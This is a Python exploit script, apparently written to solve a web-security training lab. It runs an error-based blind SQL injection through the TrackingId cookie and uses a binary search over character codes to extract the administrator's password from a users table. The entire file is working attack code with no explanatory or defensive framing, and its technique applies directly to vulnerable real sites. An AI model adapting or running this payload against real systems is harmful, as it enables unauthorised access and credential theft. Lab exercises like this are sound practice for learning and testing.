#!/usr/bin/python3.6

import requests

LAB_URL = 'https://acc81f041ebfc454803a177f00320014.web-security-academy.net/'

_payload = lambda count, ch, operator: 'xyz\'+UNION+SELECT+CASE+WHEN+(username=\'administrator\'+AND+SUBSTR(password,'+ count + ',1)' + operator + '\'' + ch + '\')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users--'

_headers = lambda payload: {'Cookie': 'TrackingId=' + payload + \
'session=4PimUJlWIHlSzRYyVfQgQxp9N0Vs3bEF'}

PASSWORD_LENGTH = 6
count = 1
password = ''

while count <= PASSWORD_LENGTH:
	first = 33
	last = 126
	mid = None
	found = False

	while first <= last and not found:
		mid = (first + last) // 2
		payload_str = _payload(str(count),chr(mid), '=')
		print('[*]Sending(eq) {} {}'.format(payload_str, mid))
		#make request with payload
		res = requests.get(LAB_URL, headers=_headers(payload_str))	
		if res.status_code == 500:
			password += chr(mid)
			print('[*]Found character at position {} -> \'{}\''.format(count, chr(mid)))
			found = True		
		elif res.status_code == 200:
			payload_str = _payload(str(count), chr(mid), '>')
			print('[*]Sending(gt or lt) {} {}'.format(payload_str, mid))
			res = requests.get(LAB_URL, headers=_headers(payload_str))
			if res.status_code == 500:
				first = mid + 1
			elif res.status_code == 200:
				last = mid - 1
			else:pass
		else:pass				
	count += 1			
		 
print('------------------------------------')
if password:
	print('\n\nFound password {}'.format(password))
else:print('Password not found')
